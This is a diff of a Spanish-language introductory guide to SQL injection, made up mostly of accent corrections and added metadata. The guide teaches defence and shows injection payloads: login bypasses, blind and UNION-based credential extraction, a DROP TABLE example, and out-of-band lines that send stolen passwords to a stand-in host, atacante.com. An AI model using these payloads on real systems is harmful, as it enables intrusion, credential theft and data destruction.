@@ -1,5 +1,8 @@
 ---
 title: "Inyección SQL (SQLi): Engañando al Archivero"
+level: "inicial"
+content_type: "guia"
+updated: "2026-06-29"
 ---
 
 # Inyección SQL (SQLi): Engañando al Archivero
@@ -8,7 +11,7 @@ title: "Inyección SQL (SQLi): Engañando al Archivero"
 
 Entender la vulnerabilidad web más famosa, antigua y devastadora de la historia. A pesar de tener más de 25 años de antigüedad, la Inyección SQL sigue destruyendo empresas hoy en día.
 
-Ocurre cuando un programador confía ciegamente en lo que el usuario escribe en una caja de texto, permitiendo que el usuario envíe codigo malicioso directamente a la base de datos de la empresa. No importa si tu servidor esta en la nube más cara de AWS o si tu frontend esta hecho con el framework más moderno de JavaScript. Si concatenas texto en una consulta SQL, eres vulnerable.
+Ocurre cuando un programador confía ciegamente en lo que el usuario escribe en una caja de texto, permitiendo que el usuario envíe código malicioso directamente a la base de datos de la empresa. No importa si tu servidor esta en la nube más cara de AWS o si tu frontend esta hecho con el framework más moderno de JavaScript. Si concatenas texto en una consulta SQL, eres vulnerable.
 
 Esta guía cubre desde los fundamentos más básicos hasta variantes avanzadas como Blind SQLi, Second-Order SQLi, y técnicas de bypass de filtros. No es solo teoría: es la experiencia de haber visto sistemas completos caer por una sola comilla mal filtrada.
 
@@ -44,7 +47,7 @@ El lenguaje oficial con el que le das órdenes al archivero se llama **SQL**.
 
 ### El Escenario Normal
 
-En tu pagina web tienes una caja de texto para que los clientes busquen productos. Un cliente escribe la palabra `Zapatos`.
+En tu página web tienes una caja de texto para que los clientes busquen productos. Un cliente escribe la palabra `Zapatos`.
 
 El servidor web (El Cocinero) toma la palabra `Zapatos` y construye la siguiente oración lógica en SQL:
 
@@ -58,7 +61,7 @@ El archivero obedece, saca los expedientes de zapatos y te los da. Todo es feliz
 
 ## El Ataque: Inyección Básica
 
-Un Hacker llega a tu pagina web y, en la caja de búsqueda de productos, en lugar de escribir "Zapatos", escribe lo siguiente exactamente (incluyendo la comilla simple al principio):
+Un Hacker llega a tu página web y, en la caja de búsqueda de productos, en lugar de escribir "Zapatos", escribe lo siguiente exactamente (incluyendo la comilla simple al principio):
 
 ```
 ' OR 1=1 --
@@ -103,7 +106,7 @@ El atacante escribe en el campo de usuario:
 admin' --
 ```
 
-Y en contrasena escribe cualquier cosa.
+Y en contraseña escribe cualquier cosa.
 
 La consulta se convierte en:
 
@@ -127,7 +130,7 @@ La consulta se convierte en:
 SELECT * FROM usuarios WHERE usuario = '' OR 1=1 --' AND contrasena = 'cualquier_cosa';
 ```
 
-Esto devuelve TODOS los usuarios registrados. El servidor tipicamente toma el primer resultado (que podría ser un administrador). El atacante entra sin conocer ninguna credencial.
+Esto devuelve TODOS los usuarios registrados. El servidor típicamente toma el primer resultado (que podría ser un administrador). El atacante entra sin conocer ninguna credencial.
 
 ## Tipos de Inyección SQL
 
@@ -165,13 +168,13 @@ El atacante envía una condición que siempre es verdadera y observa si la respu
 ' AND 1=2 --  (Pagina diferente o error)
 ```
 
-Si la pagina se comporta diferente, el atacante sabe que puede inyectar. Luego puede hacer preguntas como:
+Si la página se comporta diferente, el atacante sabe que puede inyectar. Luego puede hacer preguntas como:
 
 ```
 ' AND (SELECT SUBSTRING(contrasena,1,1) FROM usuarios WHERE id=1) = 'a' --
 ```
 
-Si la pagina carga normal, la primera letra de la contraseña del administrador es 'a'. Si no, prueba con 'b', 'c', etc. El atacante adivina la contraseña letra por letra.
+Si la página carga normal, la primera letra de la contraseña del administrador es 'a'. Si no, prueba con 'b', 'c', etc. El atacante adivina la contraseña letra por letra.
 
 Esto es lento pero completamente automatizable. Herramientas como SQLMap hacen esto en segundos.
 
@@ -182,25 +185,25 @@ Cuando no hay diferencias visibles entre respuestas verdaderas y falsas, el atac
 ' AND IF(1=1, SLEEP(5), 0) --
 ```
 
-Si la pagina tarda 5 segundos en cargar, la condición era verdadera. El atacante puede extraer datos usando preguntas que condicionan el retardo.
+Si la página tarda 5 segundos en cargar, la condición era verdadera. El atacante puede extraer datos usando preguntas que condicionan el retardo.
 
 ### Second-Order SQLi (Inyección SQL de Segundo Orden)
 
-Es más sutil. El atacante inyecta codigo SQL en un campo que se almacena en la base de datos (como el nombre de usuario al registrarse). En el momento del registro, el codigo no se ejecuta porque la consulta INSERT usa consultas preparadas.
+Es más sutil. El atacante inyecta código SQL en un campo que se almacena en la base de datos (como el nombre de usuario al registrarse). En el momento del registro, el código no se ejecuta porque la consulta INSERT usa consultas preparadas.
 
-Pero cuando otra funcion del sistema recupera ese nombre de usuario y lo usa en una consulta SQL (tal vez concatenandolo), el codigo inyectado se activa.
+Pero cuando otra función del sistema recupera ese nombre de usuario y lo usa en una consulta SQL (tal vez concatenandolo), el código inyectado se activa.
 
 **Ejemplo:**
 1. El atacante se registra con el nombre: `Roberto'; DROP TABLE usuarios; --`
 2. El sistema guarda el nombre en la base de datos usando consultas preparadas. No hay problema ahí.
-3. Dias después, un administrador ejecuta un reporte que dice: "Mostrar pedidos del usuario: " + nombreUsuario.
+3. Días después, un administrador ejecuta un reporte que dice: "Mostrar pedidos del usuario: " + nombreUsuario.
 4. La consulta concatenada ejecuta el DROP TABLE y destruye la tabla de usuarios.
 
 ### Out-of-Band SQLi
 
 Cuando el atacante no puede recibir los resultados directamente en la respuesta HTTP, pero el servidor puede hacer peticiones a otros sistemas (como DNS o HTTP). El atacante usa funciones de base de datos que hacen peticiones externas para enviar los datos robados a un servidor controlado por el atacante.
 
-Ejemplo en Oracle (funcion UTL_HTTP):
+Ejemplo en Oracle (función UTL_HTTP):
 ```
 ' AND UTL_HTTP.request('http://atacante.com/robo?dato=' || (SELECT contrasena FROM usuarios WHERE id=1)) --
 ```
@@ -226,13 +229,13 @@ O con UNION:
 ' UNION SELECT NULL, NULL, NULL -- (Funciona: 3 columnas)
 ```
 
-**Paso 2: Encontrar que columnas muestran información en la pagina.**
+**Paso 2: Encontrar que columnas muestran información en la página.**
 
 ```
 ' UNION SELECT 1, 2, 3 --
 ```
 
-Si el número 2 aparece en la pagina, la columna 2 se puede usar para mostrar datos extraidos.
+Si el número 2 aparece en la página, la columna 2 se puede usar para mostrar datos extraidos.
 
 **Paso 3: Extraer datos de otras tablas.**
 
@@ -240,7 +243,7 @@ Si el número 2 aparece en la pagina, la columna 2 se puede usar para mostrar da
 ' UNION SELECT 1, usuario, contrasena FROM admins --
 ```
 
-Ahora los nombres de usuario y contraseñas de la tabla `admins` aparecen en la pagina.
+Ahora los nombres de usuario y contraseñas de la tabla `admins` aparecen en la página.
 
 ## Comandos Destructivos
 
@@ -309,14 +312,14 @@ Cada motor de base de datos tiene sus propias funciones y sintaxis. Un atacante 
 
 **MySQL/MariaDB:**
 - Comentarios: `-- `, `#`, `/* */`
-- Funcion de versión: `VERSION()`
+- Función de versión: `VERSION()`
 - Base de datos actual: `DATABASE()`
 - Usuario actual: `USER()`
 - Concatenacion: `CONCAT(columna1, columna2)`
 
 **PostgreSQL:**
 - Comentarios: `-- `
-- Funcion de versión: `VERSION()`
+- Función de versión: `VERSION()`
 - Base de datos actual: `CURRENT_DATABASE()`
 - Stacked queries: `SELECT 1; SELECT 2`
 - Envio de peticiones: `COPY (SELECT 'dato') TO PROGRAM 'curl http://atacante.com/'`
@@ -337,7 +340,7 @@ Cada motor de base de datos tiene sus propias funciones y sintaxis. Un atacante 
 
 **Caso Heartland Payment Systems (2008):** Un atacante exploto una SQL Injection en los sistemas de procesamiento de pagos de Heartland. Más de 130 millones de tarjetas de crédito fueron comprometidas. La empresa pago más de $140 millones en multas y compensaciones. El atacante, Albert Gonzalez, fue condenado a 20 años de prisión.
 
-**Caso Sony Pictures (2011):** SQL Injection en los servidores de Sony permitió a atacantes robar datos de 77 millones de usuarios de PlayStation Network. El servicio estuvo caído 23 dias. El costo total superó los $170 millones.
+**Caso Sony Pictures (2011):** SQL Injection en los servidores de Sony permitió a atacantes robar datos de 77 millones de usuarios de PlayStation Network. El servicio estuvo caído 23 días. El costo total superó los $170 millones.
 
 **Caso Yahoo (2012):** Un atacante uso SQL Injection para robar 450,000 nombres de usuario y contraseñas de Yahoo Voices. Las contraseñas estaban almacenadas en texto plano.
 
@@ -366,7 +369,7 @@ $stmt = $pdo->prepare("SELECT * FROM usuarios WHERE usuario = :usuario");
 $stmt->execute(['usuario' => $_POST['usuario']]);
 ```
 
-Con prepared statements, el input del usuario se trata como datos, no como codigo SQL. La base de datos sabe que el valor de `:usuario` es un string literal, sin importar que contenga comillas, guiones o comandos SQL.
+Con prepared statements, el input del usuario se trata como datos, no como código SQL. La base de datos sabe que el valor de `:usuario` es un string literal, sin importar que contenga comillas, guiones o comandos SQL.
 
 ### Defensa en Profundidad
 
@@ -377,7 +380,7 @@ Además de prepared statements, implementa:
 3. **Escapado de caracteres (solo como respaldo):** Funciones como `mysqli_real_escape_string()` en PHP. No es tan seguro como prepared statements pero es mejor que nada.
 4. **WAF (Web Application Firewall):** Herramientas como ModSecurity o AWS WAF pueden detectar y bloquear patrones de SQLi antes de que lleguen al servidor. No confíes solo en esto pero es una buena capa adicional.
 
-### Detección de SQLi en el Codigo (SAST)
+### Detección de SQLi en el Código (SAST)
 
 Las herramientas SAST (Static Application Security Testing) como SonarQube, Checkmarx o Snyk pueden detectar concatenacion de strings en consultas SQL automáticamente. Si tu pipeline CI/CD tiene un paso SAST que falla cuando detecta concatenacion SQL, el error nunca llega a producción.
 
@@ -401,17 +404,17 @@ Un Web Application Firewall (WAF) o Sistema de Detección de Intrusiones (IDS) p
 
 ## Autoevaluación
 
-1. Estas auditando una pagina web y escribes una comilla simple (`'`) en la caja de búsqueda. La pagina se rompe y te devuelve un mensaje rojo gigantesco que dice: `Error Code 1064: You have an error in your SQL syntax near...`. Por que ese mensaje es información valiosa para un Penetration Tester?
+1. Estas auditando una página web y escribes una comilla simple (`'`) en la caja de búsqueda. La página se rompe y te devuelve un mensaje rojo gigantesco que dice: `Error Code 1064: You have an error in your SQL syntax near...`. Por qué ese mensaje es información valiosa para un Penetration Tester?
 
-2. Un programador te dice: "Yo no sufro de SQL Injection porque programé un filtro que elimina todas las comillas simples de lo que escribe el usuario." Por que los filtros manuales (Blacklisting) suelen ser una mala idea comparado con usar Consultas Preparadas?
+2. Un programador te dice: "Yo no sufro de SQL Injection porque programé un filtro que elimina todas las comillas simples de lo que escribe el usuario." Por qué los filtros manuales (Blacklisting) suelen ser una mala idea comparado con usar Consultas Preparadas?
 
 3. Si un hacker quiere destruir la empresa de forma vengativa, que comando de inyección clásico (DROP) podría intentar insertar para borrar una tabla entera?
 
-4. En un ataque de Authentication Bypass (burlar el login), por que `' OR 1=1 --` logra engañar a la base de datos para dejar entrar al atacante sin contrasena?
+4. En un ataque de Authentication Bypass (burlar el login), por qué `' OR 1=1 --` logra engañar a la base de datos para dejar entrar al atacante sin contraseña?
 
 5. Explica la diferencia práctica entre SQLi clásica (donde ves los resultados en pantalla) y Blind SQLi basada en tiempo. Cuando usarías cada una?
 
-6. Un desarrollador usa un ORM moderno (como Entity Framework o Eloquent) para todas las consultas, pero en un modulo de reportes usa "raw SQL" porque "es más fácil y solo lo usa el administrador". Por que esta decisión crea un riesgo de SQL Injection de Segundo Orden?
+6. Un desarrollador usa un ORM moderno (como Entity Framework o Eloquent) para todas las consultas, pero en un módulo de reportes usa "raw SQL" porque "es más fácil y solo lo usa el administrador". Por qué esta decisión crea un riesgo de SQL Injection de Segundo Orden?
 
 7. Durante un pentest, encuentras que el parámetro `id` en la URL `producto.php?id=5` es vulnerable a SQLi. Sin embargo, cuando intentas `' OR 1=1 --`, el servidor devuelve un error 500. Cuando pruebas `' OR 1=2 --`, también devuelve error 500. Como determinas si realmente hay SQLi o es un falso positivo?
 
